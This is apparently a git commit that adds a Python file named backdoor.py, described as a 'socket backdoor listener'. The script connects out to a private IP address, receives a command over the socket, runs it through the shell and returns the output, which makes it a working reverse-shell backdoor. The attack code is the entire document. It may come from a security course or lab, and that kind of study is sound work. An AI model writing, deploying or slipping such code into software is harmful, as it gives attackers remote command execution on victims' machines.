af83cb6778c316e3839c1c1f025a1b4461c1ef23
root <root@localhost.localdomain>
2019-05-13 02:03:48 -0400

    socket backdoor listener

---
+++ backdoor.py
@@ -0,0 +1,15 @@
+import socket
+import subprocess
+
+def command_exe(command):
+    return subprocess.check_output(command, shell=True)
+
+connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+connection.connect(("10.0.2.4",80))
+connection.send("Connection OK\n")
+
+command = connection.recv(1024)
+command_output = command_exe(command)
+connection.send(command_output)
+
+connection.close()
